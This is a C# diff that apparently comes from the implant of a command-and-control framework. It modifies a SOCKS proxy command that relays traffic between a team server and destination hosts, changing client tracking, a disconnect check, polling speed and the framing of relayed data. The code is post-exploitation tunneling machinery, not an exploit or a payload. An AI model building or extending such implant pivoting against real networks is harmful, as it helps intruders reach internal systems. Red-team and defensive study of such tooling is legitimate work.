@@ -18,7 +18,7 @@ namespace Engineer.Commands
 {
     internal class socks : EngineerCommand
     {
-        public static List<string> SocksClients = new();
+        public static SynchronizedCollection<string> SocksClients = new();
         public static readonly  ConcurrentDictionary<string, ConcurrentQueue<byte[]>> SocksClientsData = new();
  
 
@@ -36,7 +36,6 @@ namespace Engineer.Commands
             }
 
             Tasking.FillTaskResults($"socks started on team server at port {port}", task, EngTaskStatus.Running,TaskResponseType.String);
-
         }
     }
     internal class socksConnect : EngineerCommand
@@ -79,16 +78,17 @@ namespace Engineer.Commands
             try
             {               
                 await destination.ConnectAsync(ipAddress, portInt);
+                //Console.WriteLine($"Connected to {ipAddress}:{portInt}");
                 while (!socks._tokenSource.IsCancellationRequested)
                 {
                     
-                    //if destination is not connected remove it from the socks clients list and dictionarys and exit while loop
-                    if (!destination.Connected)
-                    {
-                        socks.SocksClients.Remove(client);
-                        socks.SocksClientsData.TryRemove(client, out var _);
-                        break;
-                    }
+                    ////if destination is not connected remove it from the socks clients list and dictionarys and exit while loop
+                    //if (!destination.Connected)
+                    //{
+                    //    socks.SocksClients.Remove(client);
+                    //    socks.SocksClientsData.TryRemove(client, out var _);
+                    //    break;
+                    //}
                     
                     // send to destination
                     if (!socks.SocksClientsData[client].IsEmpty)
@@ -113,11 +113,10 @@ namespace Engineer.Commands
                             {"/client",client }
                         }
                         };
-                       Program.InboundCommandsRec += 1;
-                       Task.Run(async() => await Tasking.DealWithTask(task));
+                        Task.Run(async() => await Tasking.DealWithTask(task));
                     }
                     // rip cpu
-                    await Task.Delay(10);
+                    await Task.Delay(2);
                 }
             }
             catch (Exception e)
@@ -139,7 +138,6 @@ namespace Engineer.Commands
             //while the socks client is waiting for data to be sent do not send the data 
             var req = task.File;
             socks.SocksClientsData[client].Enqueue(req);
-            Tasking.FillTaskResults($"Sending data",task,EngTaskStatus.Complete,TaskResponseType.String);
         }
     }
     
@@ -150,8 +148,15 @@ namespace Engineer.Commands
         public override async Task Execute(EngineerTask task)
         {
             // trygetvalue of task.arguments /data and return that value
+            var sockContent = task.File;
+            //set task.FIle to null otherwise we are sending the data in the task object and the result string 
             task.Arguments.TryGetValue("/client", out var client);
-            Tasking.FillTaskResults(Convert.ToBase64String(task.File) + "\n" + client, task, EngTaskStatus.Complete,TaskResponseType.String);
+            byte[] sockClient = client.JsonSerialize();
+            byte[] socks_client_length = BitConverter.GetBytes(sockClient.Length);
+            task.File = null;
+            byte[] finalSocksRec_content = socks_client_length.Concat(sockClient).Concat(sockContent).ToArray();
+
+           Tasking.FillTaskResults(finalSocksRec_content, task, EngTaskStatus.Complete, TaskResponseType.None);
         }
     }
 
